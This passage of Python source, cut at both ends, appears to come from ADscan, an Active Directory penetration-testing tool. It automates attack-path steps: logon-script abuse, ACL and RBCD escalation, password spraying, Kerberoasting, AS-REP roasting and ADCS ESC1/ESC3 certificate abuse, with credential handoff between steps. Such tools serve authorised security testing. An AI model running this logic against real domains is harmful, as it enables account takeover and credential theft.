                                "follow_on_outcome": {
                                    "key": "user_credential_obtained",
                                    "compromised_user": str(
                                        strategy_notes.get("next_step_target_user")
                                        or ""
                                    ),
                                    "credential": str(
                                        strategy_notes.get("generated_password") or ""
                                    ),
                                },
                            },
                        )
                        add_credential_fn = getattr(shell, "add_credential", None)
                        if callable(add_credential_fn):
                            add_credential_fn(
                                domain,
                                str(strategy_notes.get("next_step_target_user") or ""),
                                str(strategy_notes.get("generated_password") or ""),
                                prompt_for_user_privs_after=False,
                                credential_origin="writelogonscript",
                            )
                        _attempt_writelogonscript_cleanup_if_ready(
                            shell,
                            domain=domain,
                            summary=summary,
                        )
                        if continue_path:
                            continue
                    else:
                        _apply_chained_step_execution_result(
                            source_action=action,
                            source_from_label=from_label,
                            source_to_label=to_label,
                            execution_result={
                                "step_index": int(
                                    strategy_notes.get("chained_step_index") or -1
                                ),
                                "action": str(
                                    strategy_notes.get("chained_step_action")
                                    or strategy_notes.get("next_step_action")
                                    or ""
                                ),
                                "from_label": str(
                                    strategy_notes.get("chained_step_from_label")
                                    or to_label
                                    or ""
                                ),
                                "to_label": str(
                                    strategy_notes.get("chained_step_to_label") or ""
                                ),
                                "status": "attempted",
                                "notes": {
                                    "verification_status": "pending",
                                    "execution_origin_action": action,
                                    "execution_origin_from": from_label,
                                    "execution_origin_to": to_label,
                                    "credential_confirmed_user": str(
                                        strategy_notes.get("next_step_target_user")
                                        or ""
                                    ),
                                    "verification_wait_seconds": int(
                                        poll_notes.get("verification_wait_seconds") or 0
                                    ),
                                    "verification_attempts": int(
                                        poll_notes.get("verification_attempts") or 0
                                    ),
                                    "target_login_required": bool(
                                        poll_notes.get("target_login_required")
                                    ),
                                },
                                "actor": str(strategy_notes.get("user") or ""),
                                "reason": "pending_via_writelogonscript",
                            },
                        )
                    return execution_started
                if strategy_state == "failed":
                    final_notes = dict(details)
                    final_notes.update(probe_notes)
                    final_notes.update(strategy_notes)
                    _update_attack_path_edge_status(
                        shell,
                        domain,
                        from_label=from_label,
                        relation=action,
                        to_label=to_label,
                        status="failed",
                        notes=final_notes,
                    )
                    print_warning(
                        "WriteLogonScript staging failed after the write precheck succeeded."
                    )
                    return execution_started
                if strategy_state == "blocked":
                    final_notes = dict(details)
                    final_notes.update(probe_notes)
                    final_notes.update(strategy_notes)
                    _update_attack_path_edge_status(
                        shell,
                        domain,
                        from_label=from_label,
                        relation=action,
                        to_label=to_label,
                        status="blocked",
                        notes=final_notes,
                    )
                    print_warning("WriteLogonScript payload staging was blocked.")
                    return execution_started
                print_info(
                    "WriteLogonScript precheck succeeded: staging-share write was confirmed with a benign .bat probe. "
                    "No supported follow-up payload strategy was available yet."
                )
                return execution_started

            if key in ACL_ACE_RELATIONS:
                if not from_label or not to_label:
                    _record_attack_path_execution_event(
                        shell,
                        domain=domain,
                        summary=summary,
                        event_stage="step_blocked",
                        message=f"Cannot execute {action}: missing path endpoint details.",
                        step_index=idx,
                        total_steps=total_executable_steps,
                        executable_step_index=executable_step_position,
                        last_executable_idx=last_executable_idx,
                        action=action,
                        from_label=from_label,
                        to_label=to_label,
                        step_status="blocked",
                        reason="missing_from_to_details",
                    )
                    print_warning(f"Cannot execute {action}: missing from/to details.")
                    return execution_started

                # RBCD chain coordination: when this write-to-group step feeds a
                # downstream AllowedToAct whose trustee is this very group, the
                # member to add must be an owned SPN-bearing account (the one the
                # AllowedToAct will mint as), NOT the path-source executor — a
                # member without an SPN cannot do S4U, so the RBCD would fail
                # KDC_ERR_BADOPTION. Resolve it via the shared helper so both the
                # AddMember and the AllowedToAct steps agree on the same principal.
                # AddSelf is excluded (it can only add the executor itself).
                rbcd_member_to_add: str | None = None
                if key in {"genericall", "genericwrite", "addmember"} and to_label:
                    _next_step = steps[idx] if idx < len(steps) else None
                    if isinstance(_next_step, dict):
                        _next_action = str(_next_step.get("action") or "").strip().lower()
                        _next_details = (
                            _next_step.get("details")
                            if isinstance(_next_step.get("details"), dict)
                            else {}
                        )
                        _next_from = str(_next_details.get("from") or "").strip()
                        if (
                            _next_action == "allowedtoact"
                            and _next_from.upper() == to_label.strip().upper()
                        ):
                            rbcd_member_to_add = _resolve_owned_spn_member_for_rbcd(
                                shell, domain=domain, trustee_label=to_label
                            )
                            if rbcd_member_to_add:
                                print_info_debug(
                                    "[rbcd-coord] next step is AllowedToAct on group "
                                    f"{mark_sensitive(to_label, 'node')}; AddMember will add "
                                    f"the SPN-bearing account "
                                    f"{mark_sensitive(rbcd_member_to_add, 'user')}"
                                )

                exec_context = build_ace_step_context(
                    shell,
                    domain,
                    relation=key,
                    summary=summary,
                    from_label=from_label,
                    to_label=to_label,
                    context_username=context_username,
                    context_password=context_password,
                    member_to_add=rbcd_member_to_add,
                )
                if not exec_context:
                    marked_from = mark_sensitive(from_label, "node")
                    marked_to = mark_sensitive(to_label, "node")
                    _record_attack_path_execution_event(
                        shell,
                        domain=domain,
                        summary=summary,
                        event_stage="step_blocked",
                        message=f"Cannot execute {action}: no usable execution credential context was available.",
                        step_index=idx,
                        total_steps=total_executable_steps,
                        executable_step_index=executable_step_position,
                        last_executable_idx=last_executable_idx,
                        action=action,
                        from_label=from_label,
                        to_label=to_label,
                        step_status="blocked",
                        reason="no_usable_execution_context",
                    )
                    print_warning(
                        f"Cannot execute {action} ({marked_from} -> {marked_to}): "
                        "no usable execution credential context available."
                    )
                    _mark_blocked_step(
                        action,
                        from_label,
                        to_label,
                        kind="unavailable",
                        reason="No usable execution credential context available",
                    )
                    return execution_started

                supported, reason = describe_ace_step_support(exec_context)
                if not supported:
                    _record_attack_path_execution_event(
                        shell,
                        domain=domain,
                        summary=summary,
                        event_stage="step_blocked",
                        message=f"Cannot execute {action}: target type is not supported for this step.",
                        step_index=idx,
                        total_steps=total_executable_steps,
                        executable_step_index=executable_step_position,
                        last_executable_idx=last_executable_idx,
                        action=action,
                        from_label=from_label,
                        to_label=to_label,
                        step_status="blocked",
                        reason=reason or "unsupported_target_type",
                        actor=exec_context.exec_username,
                    )
                    # Show the same "not implemented" UX: action is mapped in general,
                    # but not for this target object type.
                    _mark_blocked_step(
                        action,
                        from_label,
                        to_label,
                        kind="unsupported",
                        reason=reason or "Not supported for this target type",
                    )
                    table = Table(
                        title=Text(
                            "Steps in this path", style=f"bold {BRAND_COLORS['info']}"
                        ),
                        show_header=True,
                        header_style=f"bold {BRAND_COLORS['info']}",
                        show_lines=True,
                    )
                    table.add_column("#", style="dim", width=4, justify="right")
                    table.add_column("Action", style="bold")
                    table.add_column(
                        "Supported", style="bold", width=10, justify="center"
                    )
                    table.add_column("Notes", style="dim", overflow="fold")

                    for step_idx, step_item in enumerate(steps, start=1):
                        if not isinstance(step_item, dict):
                            continue
                        step_action = str(step_item.get("action") or "").strip()
                        step_key = step_action.lower()

                        if step_idx == idx:
                            supported_label = Text("No", style="bold red")
                            notes = reason or "Not implemented for this target type"
                        elif step_key in supported_actions:
                            supported_label = Text("Yes", style="bold green")
                            notes = supported_actions.get(step_key, "")
                        elif step_key in non_executable_actions:
                            supported_label = Text("N/A", style="bold cyan")
                            notes = non_executable_actions.get(step_key, "")
                        elif step_key in dangerous_actions:
                            supported_label = Text("No", style="bold yellow")
                            notes = dangerous_actions.get(step_key, "")
                        else:
                            supported_label = Text("No", style="bold red")
                            notes = "Not implemented yet in ADscan"
                        table.add_row(
                            str(step_idx), step_action or "N/A", supported_label, notes
                        )

                    message = Text()
                    message.append(
                        "This attack path can't be executed yet.\n\n", style="bold red"
                    )
                    message.append(
                        "ADscan recognizes this action, but it is not implemented for the "
                        "target object type in this path.\n",
                        style="red",
                    )
                    marked_to = mark_sensitive(to_label, "node")
                    message.append(
                        f"\nUnsupported step: {action} -> {marked_to}\n",
                        style="dim",
                    )
                    if reason:
                        message.append(f"\nReason: {reason}\n", style="dim")
                    message.append(
                        "\nTip: pick a path that contains only supported steps for the "
                        "target types, or continue with other enumeration steps.",
                        style="dim",
                    )

                    print_panel(
                        [message, table],
                        title=Text("Attack Path Not Implemented", style="bold red"),
                        border_style="red",
                        expand=False,
                    )
                    return False

                execution_started = True
                ace_result: bool | None = (
                    None  # sentinel — safe to check after try/except
                )
                _record_attack_path_execution_event(
                    shell,
                    domain=domain,
                    summary=summary,
                    event_stage="step_attempting",
                    message=f"Attempting {action} on {to_label}.",
                    step_index=idx,
                    total_steps=total_executable_steps,
                    executable_step_index=executable_step_position,
                    last_executable_idx=last_executable_idx,
                    action=action,
                    from_label=from_label,
                    to_label=to_label,
                    step_status="attempting",
                    actor=exec_context.exec_username,
                )
                with _active_step_context(
                    action=action,
                    from_label=from_label,
                    to_label=to_label,
                    notes={"user": exec_context.exec_username},
                ):
                    try:
                        _update_attack_path_step_status_at_index(
                            shell,
                            domain=domain,
                            summary=summary,
                            step_index=idx - 1,
                            status="attempted",
                            notes={"user": exec_context.exec_username},
                        )

                        # Intermediate control-to-wield: when an
                        # owner/DACL-grant step is NOT the terminal step and the
                        # next edge is sourced from this very object, granting
                        # control is not enough — the executor must escalate to
                        # effective GenericAll and WIELD it so the next step runs
                        # as the now-correct principal. The grant-only stubs for
                        # writeowner/writedacl otherwise leave the next step
                        # authenticating as the wrong principal -> the
                        # insufficientAccessRights bug on chains like
                        # WriteOwner(group) -> the group's outbound edge.
                        # genericall/genericwrite already wield inline (untouched)
                        # and writedacl->domain stays a same-principal two-edge
                        # DCSync sequence (target_kind=="domain" excluded below).
                        _ctw_next_edge = steps[idx] if idx < len(steps) else None
                        _ctw_intermediate = idx != last_executable_idx
                        # target_kind is the graph node's RAW kind — PascalCase
                        # ("Group"/"User"/"Computer"/"Domain"). Normalize before the
                        # gate (every other ACE comparison uses .lower()). Comparing
                        # the PascalCase value against a lowercase set made this gate
                        # ALWAYS-False, so the ladder never fired for any real path
                        # (the WriteOwner-on-group → insufficientAccessRights bug).
                        _ctw_target_kind = str(exec_context.target_kind or "").strip().lower()
                        _ctw_will_fire = (
                            key in {"writeowner", "writedacl"}
                            and _ctw_intermediate
                            and _ctw_target_kind in {"user", "group", "computer"}
                            and isinstance(_ctw_next_edge, dict)
                        )
                        # Bracket-free marker (Rich-markup rule) so a future non-fire
                        # is greppable instead of silently falling to the legacy path.
                        print_info_debug(
                            "control-escalation gate: "
                            f"relation={key} intermediate={_ctw_intermediate} "
                            f"target_kind={_ctw_target_kind or 'unknown'} "
                            f"next_edge={'present' if isinstance(_ctw_next_edge, dict) else 'none'} "
                            f"will_fire={_ctw_will_fire}"
                        )
                        if _ctw_will_fire:
                            _ctw = ensure_control_to_wield_next_edge(
                                shell,
                                exec_context=exec_context,
                                control_relation=key,
                                to_label=to_label,
                                next_edge=_ctw_next_edge,
                            )
                            # Every rung drove execute_ace_step, so the executor
                            # already left the richer outcome on the shell (group
                            # -> group_membership_changed; user/computer -> the
                            # real produced credential). Do NOT synthesize an
                            # outcome here — the unified handoff below threads it.
                            if _ctw.escalated:
                                # A fired ladder counts as success only if its
                                # inline wield SUCCEEDED (group AddMember /
                                # user|computer GenericAll abuse). An attempted-
                                # but-failed wield marks the step FAILED so the
                                # chain stops instead of advancing against a
                                # non-member / uncompromised principal. Targets
                                # with no inline wield (domain/OU) have
                                # attempted_wield=False -> success on the rung alone.
                                ace_result = _ctw.wielded or not _ctw.attempted_wield
                            else:
                                # Ladder could not escalate -> fall back to the
                                # legacy grant-only execution (no worse than before).
                                ace_result = execute_ace_step(
                                    shell, context=exec_context
                                )
                        else:
                            ace_result = execute_ace_step(
                                shell, context=exec_context
                            )
                        last_outcome = get_last_ace_execution_outcome(shell) or {}
                        _apply_execution_outcome_context_handoff(last_outcome)
                        register_cleanup_from_outcome(
                            shell,
                            domain=domain,
                            outcome=last_outcome,
                            from_label=from_label,
                            relation=action,
                            to_label=to_label,
                        )
                        offer_followups = (
                            idx == last_executable_idx and ace_result is True
                        )
                        if ace_result is True:
                            _update_attack_path_step_status_at_index(
                                shell,
                                domain=domain,
                                summary=summary,
                                step_index=idx - 1,
                                status="success",
                                notes={"user": exec_context.exec_username},
                            )
                            _record_attack_path_execution_event(
                                shell,
                                domain=domain,
                                summary=summary,
                                event_stage="step_succeeded",
                                message=f"{action} succeeded on {to_label}.",
                                step_index=idx,
                                total_steps=total_executable_steps,
                                executable_step_index=executable_step_position,
                                last_executable_idx=last_executable_idx,
                                action=action,
                                from_label=from_label,
                                to_label=to_label,
                                step_status="success",
                                actor=exec_context.exec_username,
                            )
                        elif ace_result is False:
                            _update_attack_path_step_status_at_index(
                                shell,
                                domain=domain,
                                summary=summary,
                                step_index=idx - 1,
                                status="failed",
                                notes={"user": exec_context.exec_username},
                            )
                            _record_attack_path_execution_event(
                                shell,
                                domain=domain,
                                summary=summary,
                                event_stage="step_failed",
                                message=f"{action} failed on {to_label}.",
                                step_index=idx,
                                total_steps=total_executable_steps,
                                executable_step_index=executable_step_position,
                                last_executable_idx=last_executable_idx,
                                action=action,
                                from_label=from_label,
                                to_label=to_label,
                                step_status="failed",
                                actor=exec_context.exec_username,
                            )
                    except Exception as exc:  # noqa: BLE001
                        telemetry.capture_exception(exc)
                        print_warning(f"Error while executing {action} step.")
                        print_exception(show_locals=False, exception=exc)
                        _record_attack_path_execution_event(
                            shell,
                            domain=domain,
                            summary=summary,
                            event_stage="step_failed",
                            message=f"{action} raised an exception during execution.",
                            step_index=idx,
                            total_steps=total_executable_steps,
                            executable_step_index=executable_step_position,
                            last_executable_idx=last_executable_idx,
                            action=action,
                            from_label=from_label,
                            to_label=to_label,
                            step_status="failed",
                            actor=exec_context.exec_username,
                            reason=str(exc),
                        )
                        if hasattr(shell, "_update_active_attack_graph_step_status"):
                            try:
                                shell._update_active_attack_graph_step_status(  # type: ignore[attr-defined]
                                    domain=domain,
                                    status="failed",
                                    notes={"error": str(exc)},
                                )
                            except Exception as exc2:  # noqa: BLE001
                                telemetry.capture_exception(exc2)

                if offer_followups:
                    followups = build_followups_for_step(
                        shell,
                        domain=domain,
                        step_action=key,
                        exec_username=exec_context.exec_username,
                        exec_password=exec_context.exec_password,
                        target_kind=exec_context.target_kind,
                        target_label=to_label or exec_context.target_sam_or_label,
                        target_domain=exec_context.target_domain,
                        target_sam_or_label=exec_context.target_sam_or_label,
                    )
                    _run_runtime_followups(
                        step_action=action,
                        target_label_value=to_label or exec_context.target_sam_or_label,
                        initial_followups=followups,
                        last_outcome=last_outcome,
                    )

                # Abort remaining path steps when this step definitively failed.
                # A False result means the exploit ran and was rejected — the
                # target state required by the next step was never established.
                if ace_result is False:
                    _halt_path_after_failed_step(
                        action=action,
                        from_label=from_label,
                        to_label=to_label,
                        step_index=idx,
                        executable_step_position=executable_step_position,
                        actor=exec_context.exec_username,
                    )
                    break

                continue

            if key in {"passwordspray", "useraspass", "blankpassword", "computerpre2k"}:
                if not to_label:
                    _record_attack_path_execution_event(
                        shell,
                        domain=domain,
                        summary=summary,
                        event_stage="step_blocked",
                        message=f"Cannot execute {action}: missing target principal.",
                        step_index=idx,
                        total_steps=total_executable_steps,
                        executable_step_index=executable_step_position,
                        last_executable_idx=last_executable_idx,
                        action=action,
                        from_label=from_label,
                        to_label=to_label,
                        step_status="blocked",
                        reason="missing_target_principal",
                    )
                    print_warning(f"Cannot execute {action}: missing target principal.")
                    return execution_started

                target_user = _normalize_account(to_label)
                if not target_user:
                    _record_attack_path_execution_event(
                        shell,
                        domain=domain,
                        summary=summary,
                        event_stage="step_blocked",
                        message=f"Cannot execute {action}: invalid target principal.",
                        step_index=idx,
                        total_steps=total_executable_steps,
                        executable_step_index=executable_step_position,
                        last_executable_idx=last_executable_idx,
                        action=action,
                        from_label=from_label,
                        to_label=to_label,
                        step_status="blocked",
                        reason="invalid_target_principal",
                    )
                    print_warning(f"Cannot execute {action}: invalid target principal.")
                    return execution_started

                spray_type, spray_category, spray_password = (
                    _extract_password_spray_step_metadata(details)
                )
                effective_spray_type = spray_category or spray_type
                marked_target = mark_sensitive(target_user, "user")
                marked_spray_type = mark_sensitive(
                    str(effective_spray_type or "N/A"),
                    "detail",
                )

                execution_started = True
                _record_attack_path_execution_event(
                    shell,
                    domain=domain,
                    summary=summary,
                    event_stage="step_attempting",
                    message=f"Attempting {action} against {target_user}.",
                    step_index=idx,
                    total_steps=total_executable_steps,
                    executable_step_index=executable_step_position,
                    last_executable_idx=last_executable_idx,
                    action=action,
                    from_label=from_label,
                    to_label=to_label,
                    step_status="attempting",
                )
                with _active_step_context(
                    action=action,
                    from_label=from_label,
                    to_label=to_label,
                    notes={
                        "target_user": target_user,
                        "spray_type": effective_spray_type or "",
                    },
                ):
                    try:
                        update_edge_status_by_labels(
                            shell,
                            domain,
                            from_label=from_label,
                            relation=action,
                            to_label=to_label,
                            status="attempted",
                            notes={
                                "target_user": target_user,
                                "spray_type": effective_spray_type or "",
                            },
                        )
                    except Exception as exc:  # noqa: BLE001
                        telemetry.capture_exception(exc)

                    spray_runner = getattr(
                        shell, "execute_password_spray_attack_step", None
                    )
                    if callable(spray_runner):
                        attempted = bool(
                            spray_runner(
                                domain,
                                spray_type=effective_spray_type,
                                password=spray_password,
                                entry_label=from_label or None,
                            )
                        )
                    else:
                        from adscan_internal.cli.spraying import (
                            execute_password_spray_attack_step,
                        )

                        attempted = bool(
                            execute_password_spray_attack_step(
                                shell,
                                domain,
                                spray_type=effective_spray_type,
                                password=spray_password,
                                entry_label=from_label or None,
                            )
                        )

                    if not attempted:
                        _record_attack_path_execution_event(
                            shell,
                            domain=domain,
                            summary=summary,
                            event_stage="step_blocked",
                            message=f"Cannot execute {action}: spray mode could not be started.",
                            step_index=idx,
                            total_steps=total_executable_steps,
                            executable_step_index=executable_step_position,
                            last_executable_idx=last_executable_idx,
                            action=action,
                            from_label=from_label,
                            to_label=to_label,
                            step_status="blocked",
                            reason="spray_mode_could_not_start",
                        )
                        print_warning(
                            f"Cannot execute {action}: spray mode "
                            f"{marked_spray_type} could not be started."
                        )
                        _mark_blocked_step(
                            action,
                            from_label,
                            to_label,
                            kind="unavailable",
                            reason="Spray mode could not be started",
                        )
                        return execution_started

                    recovered_credential = _get_stored_domain_credential_for_user(
                        shell,
                        domain=domain,
                        username=target_user,
                    )
                    if not recovered_credential:
                        _record_attack_path_execution_event(
                            shell,
                            domain=domain,
                            summary=summary,
                            event_stage="step_failed",
                            message=f"{action} did not recover credentials for {target_user}.",
                            step_index=idx,
                            total_steps=total_executable_steps,
                            executable_step_index=executable_step_position,
                            last_executable_idx=last_executable_idx,
                            action=action,
                            from_label=from_label,
                            to_label=to_label,
                            step_status="failed",
                            reason="credential_not_recovered",
                        )
                        if hasattr(shell, "_update_active_attack_graph_step_status"):
                            try:
                                shell._update_active_attack_graph_step_status(  # type: ignore[attr-defined]
                                    domain=domain,
                                    status="failed",
                                    notes={
                                        "target_user": target_user,
                                        "spray_type": effective_spray_type or "",
                                    },
                                )
                            except Exception as exc:  # noqa: BLE001
                                telemetry.capture_exception(exc)
                        print_warning(
                            f"{action} did not recover credentials for "
                            f"{marked_target}. Stopping this path."
                        )
                        return True

                    context_username = target_user
                    context_password = recovered_credential
                    print_info_debug(
                        f"[attack_paths] execution context handed off after {action}: "
                        f"user={marked_target} "
                        f"spray_type={marked_spray_type}"
                    )
                    try:
                        update_edge_status_by_labels(
                            shell,
                            domain,
                            from_label=from_label,
                            relation=action,
                            to_label=to_label,
                            status="success",
                            notes={
                                "target_user": target_user,
                                "spray_type": effective_spray_type or "",
                            },
                        )
                    except Exception as exc:  # noqa: BLE001
                        telemetry.capture_exception(exc)
                    if hasattr(shell, "_update_active_attack_graph_step_status"):
                        try:
                            shell._update_active_attack_graph_step_status(  # type: ignore[attr-defined]
                                domain=domain,
                                status="success",
                                notes={
                                    "target_user": target_user,
                                    "spray_type": effective_spray_type or "",
                                },
                            )
                        except Exception as exc:  # noqa: BLE001
                            telemetry.capture_exception(exc)
                    _record_attack_path_execution_event(
                        shell,
                        domain=domain,
                        summary=summary,
                        event_stage="step_succeeded",
                        message=f"{action} recovered credentials for {target_user}.",
                        step_index=idx,
                        total_steps=total_executable_steps,
                        executable_step_index=executable_step_position,
                        last_executable_idx=last_executable_idx,
                        action=action,
                        from_label=from_label,
                        to_label=to_label,
                        step_status="success",
                        actor=target_user,
                    )
                continue

            if key in {"kerberoasting", "asreproasting"}:
                if not to_label:
                    _record_attack_path_execution_event(
                        shell,
                        domain=domain,
                        summary=summary,
                        event_stage="step_blocked",
                        message=f"Cannot execute {action}: missing target user.",
                        step_index=idx,
                        total_steps=total_executable_steps,
                        executable_step_index=executable_step_position,
                        last_executable_idx=last_executable_idx,
                        action=action,
                        from_label=from_label,
                        to_label=to_label,
                        step_status="blocked",
                        reason="missing_target_user",
                    )
                    print_warning(f"Cannot execute {action}: missing target user.")
                    return execution_started
                target_user = _normalize_account(to_label)
                if not target_user:
                    _record_attack_path_execution_event(
                        shell,
                        domain=domain,
                        summary=summary,
                        event_stage="step_blocked",
                        message=f"Cannot execute {action}: invalid target user.",
                        step_index=idx,
                        total_steps=total_executable_steps,
                        executable_step_index=executable_step_position,
                        last_executable_idx=last_executable_idx,
                        action=action,
                        from_label=from_label,
                        to_label=to_label,
                        step_status="blocked",
                        reason="invalid_target_user",
                    )
                    print_warning(f"Cannot execute {action}: invalid target user.")
                    return execution_started

                execution_started = True
                _record_attack_path_execution_event(
                    shell,
                    domain=domain,
                    summary=summary,
                    event_stage="step_attempting",
                    message=f"Attempting {action} against {target_user}.",
                    step_index=idx,
                    total_steps=total_executable_steps,
                    executable_step_index=executable_step_position,
                    last_executable_idx=last_executable_idx,
                    action=action,
                    from_label=from_label,
                    to_label=to_label,
                    step_status="attempting",
                )
                ok = False
                with _active_step_context(
                    action=action,
                    from_label=from_label,
                    to_label=to_label,
                    notes={"target_user": target_user},
                ):
                    if key == "kerberoasting":
                        ok = run_kerberoast_for_user(
                            shell, domain, target_user=target_user
                        )
                    else:
                        ok = run_asreproast_for_user(
                            shell, domain, target_user=target_user
                        )
                if not ok:
                    marked_user = mark_sensitive(target_user, "user")
                    _record_attack_path_execution_event(
                        shell,
                        domain=domain,
                        summary=summary,
                        event_stage="step_failed",
                        message=f"{action} did not recover credentials for {target_user}.",
                        step_index=idx,
                        total_steps=total_executable_steps,
                        executable_step_index=executable_step_position,
                        last_executable_idx=last_executable_idx,
                        action=action,
                        from_label=from_label,
                        to_label=to_label,
                        step_status="failed",
                        reason="credential_not_recovered",
                    )
                    print_warning(
                        f"{action} did not recover credentials for {marked_user}. Stopping this path."
                    )
                    return True
                _record_attack_path_execution_event(
                    shell,
                    domain=domain,
                    summary=summary,
                    event_stage="step_succeeded",
                    message=f"{action} recovered credentials for {target_user}.",
                    step_index=idx,
                    total_steps=total_executable_steps,
                    executable_step_index=executable_step_position,
                    last_executable_idx=last_executable_idx,
                    action=action,
                    from_label=from_label,
                    to_label=to_label,
                    step_status="success",
                    actor=target_user,
                )
                last_outcome = get_last_ace_execution_outcome(shell) or {}
                _apply_execution_outcome_context_handoff(last_outcome)
                if idx == last_executable_idx:
                    _run_runtime_followups(
                        step_action=action,
                        target_label_value=to_label or target_user,
                        last_outcome=last_outcome,
                    )
                # If cracking succeeded, downstream steps can use the stored credential.
                continue

            if key == "adcsesc1":
                if not from_label or not to_label:
                    print_warning("Cannot execute ADCSESC1: missing from/to details.")
                    print_info_debug(
                        f"[adcsesc1] Missing labels: from_label={from_label!r}, to_label={to_label!r}"
                    )
                    return execution_started

                # BloodHound models ESC1 as a direct edge to the Domain node. The actual
                # exploit requires a vulnerable certificate template, so we enumerate
                # templates via Certipy for the selected credential and pick one.
                exec_username = _resolve_execution_user(
                    shell,
                    domain=domain,
                    context_username=context_username,
                    summary=summary,
                    from_label=from_label,
                )
                if not exec_username:
                    marked_user = mark_sensitive(from_label, "user")
                    print_warning(
                        f"Cannot execute ADCSESC1: no execution user context available for {marked_user}."
                    )
                    _mark_blocked_step(
                        "ADCSESC1",
                        from_label,
                        to_label,
                        kind="unavailable",
                        reason="Missing execution user context",
                    )
                    print_info_debug(
                        f"[adcsesc1] No exec username: context_username={context_username!r}, "
                        f"applies_to_users={summary.get('applies_to_users')!r}"
                    )
                    return execution_started

                password = context_password or _resolve_domain_password(
                    shell, domain, exec_username
                )
                if not password:
                    marked_user = mark_sensitive(exec_username, "user")
                    print_warning(
                        f"Cannot execute ADCSESC1: no stored domain credential found for {marked_user}."
                    )
                    _mark_blocked_step(
                        "ADCSESC1",
                        from_label,
                        to_label,
                        kind="unavailable",
                        reason="Missing stored credential for execution user",
                    )
                    print_info_debug(
                        f"[adcsesc1] Missing credential: context_password={'set' if context_password else 'unset'}, "
                        f"resolved_password={'set' if _resolve_domain_password(shell, domain, exec_username) else 'unset'}"
                    )
                    return execution_started

                domain_data = getattr(shell, "domains_data", {}).get(domain, {})
                if not isinstance(domain_data, dict):
                    domain_data = {}
                if not domain_data.get("pdc"):
                    marked_domain = mark_sensitive(domain, "domain")
                    print_warning(
                        f"Cannot execute ADCSESC1 for {marked_domain}: missing PDC IP in domain data."
                    )
                    _mark_blocked_step(
                        "ADCSESC1",
                        from_label,
                        to_label,
                        kind="unavailable",
                        reason="Missing PDC IP in domain data",
                    )
                    print_info_debug(
                        f"[adcsesc1] Domain data missing pdc: keys={list(domain_data.keys())!r}"
                    )
                    return execution_started
                if not domain_data.get("adcs") or not domain_data.get("ca"):
                    marked_domain = mark_sensitive(domain, "domain")
                    print_warning(
                        f"Cannot execute ADCSESC1 for {marked_domain}: missing ADCS/CA info."
                    )
                    _mark_blocked_step(
                        "ADCSESC1",
                        from_label,
                        to_label,
                        kind="unavailable",
                        reason="Missing ADCS/CA info in domain data",
                    )
                    print_info_debug(
                        f"[adcsesc1] Missing ADCS metadata: adcs={domain_data.get('adcs')!r}, "
                        f"ca={domain_data.get('ca')!r}"
                    )
                    return execution_started

                esc1_templates = _resolve_adcs_template_candidates(
                    shell,
                    domain=domain,
                    exec_username=exec_username,
                    password=password,
                    esc_number="1",
                    details=details,
                    to_label=to_label,
                    domain_data=domain_data,
                )
                if not esc1_templates:
                    manual_template = _prompt_for_manual_adcs_template(esc_number="1")
                    if manual_template:
                        esc1_templates = [manual_template]
                        print_info_debug(
                            "[adcsesc1] Using operator-specified template: "
                            f"{mark_sensitive(manual_template, 'service')}"
                        )
                    else:
                        print_warning(
                            "No ESC1 vulnerable certificate templates found for this user."
                        )
                        return execution_started
                if not esc1_templates:
                    print_warning(
                        "No ESC1 vulnerable certificate templates found for this user."
                    )
                    return execution_started

                template = _select_adcs_template(
                    shell,
                    esc_number="1",
                    templates=esc1_templates,
                )
                if not template:
                    print_warning("ESC1 execution cancelled.")
                    return execution_started

                execution_started = True
                with _active_step_context(
                    action="ADCSESC1",
                    from_label=from_label,
                    to_label=to_label,
                    notes={
                        "username": exec_username,
                        "template_used_for_run": template,
                    },
                ):
                    try:
                        update_edge_status_by_labels(
                            shell,
                            domain,
                            from_label=from_label,
                            relation="ADCSESC1",
                            to_label=to_label,
                            status="attempted",
                            notes={
                                "username": exec_username,
                                "template_used_for_run": template,
                            },
                        )
                    except Exception as exc:  # noqa: BLE001
                        telemetry.capture_exception(exc)

                    from adscan_internal.cli.adcs_exploitation import adcs_esc1

                    esc1_result = adcs_esc1(
                        shell,
                        domain=domain,
                        username=exec_username,
                        password=password,
                        template=template,
                    )
                    if not esc1_result.success:
                        _handle_failed_adcs_step(
                            "ADCSESC1",
                            from_label,
                            to_label,
                            notes={
                                "username": exec_username,
                                "template_used_for_run": template,
                            },
                        )
                        return execution_started
                    _handle_successful_adcs_step(
                        "ADCSESC1",
                        from_label,
                        to_label,
                        notes={
                            "username": exec_username,
                            "template_used_for_run": template,
                        },
                        impersonated_target=str(
                            esc1_result.evidence.get("impersonated_target")
                            if isinstance(esc1_result.evidence, dict)
                            else ""
                        ),
                        esc_result=esc1_result,
                    )
                continue

            if key == "adcsesc3":
                if not from_label or not to_label:
                    print_warning("Cannot execute ADCSESC3: missing from/to details.")
                    return execution_started

                exec_username = _resolve_execution_user(
                    shell,
                    domain=domain,
                    context_username=context_username,
                    summary=summary,
                    from_label=from_label,
                )
                if not exec_username:
                    marked_user = mark_sensitive(from_label, "user")
                    print_warning(
                        f"Cannot execute ADCSESC3: no execution user context available for {marked_user}."
                    )
                    _mark_blocked_step(
                        "ADCSESC3",
                        from_label,
                        to_label,
                        kind="unavailable",
                        reason="Missing execution user context",
                    )
                    return execution_started

                password = context_password or _resolve_domain_password(
                    shell, domain, exec_username
                )
                if not password:
                    marked_user = mark_sensitive(exec_username, "user")
                    print_warning(
                        f"Cannot execute ADCSESC3: no stored domain credential found for {marked_user}."
                    )
                    _mark_blocked_step(
                        "ADCSESC3",
                        from_label,
                        to_label,
                        kind="unavailable",
                        reason="Missing stored credential for execution user",
                    )
                    return execution_started

                domain_data = getattr(shell, "domains_data", {}).get(domain, {})
                if not isinstance(domain_data, dict):
                    domain_data = {}
                if not domain_data.get("pdc"):
                    marked_domain = mark_sensitive(domain, "domain")
                    print_warning(
                        f"Cannot execute ADCSESC3 for {marked_domain}: missing PDC IP in domain data."
                    )
                    _mark_blocked_step(
                        "ADCSESC3",
                        from_label,
                        to_label,
                        kind="unavailable",
                        reason="Missing PDC IP in domain data",
                    )
                    return execution_started
                if not domain_data.get("adcs") or not domain_data.get("ca"):
                    marked_domain = mark_sensitive(domain, "domain")
                    print_warning(
                        f"Cannot execute ADCSESC3 for {marked_domain}: missing ADCS/CA info."
                    )
                    _mark_blocked_step(
                        "ADCSESC3",
                        from_label,
                        to_label,
                        kind="unavailable",
                        reason="Missing ADCS/CA info in domain data",
                    )
                    return execution_started

                esc3_agent_templates = _extract_cert_templates_by_role(
                    details,
                    role="agent",
                )
                if esc3_agent_templates:
                    from adscan_internal.cli.adcs_exploitation import _resolve_template_cn

